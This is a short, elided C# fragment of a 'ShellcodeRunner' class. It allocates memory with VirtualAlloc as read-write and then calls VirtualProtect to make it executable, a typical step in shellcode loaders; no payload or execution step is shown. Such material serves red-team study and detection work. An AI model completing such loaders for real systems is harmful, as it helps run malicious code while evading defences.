...
class ShellcodeRunner
{
    ...
    static void Main()
    {
        ...
        IntPtr allocatedMemory = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        ...
        uint oldProtection;
        bool vp = VirtualProtect(allocatedMemory, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READ, out oldProtection);
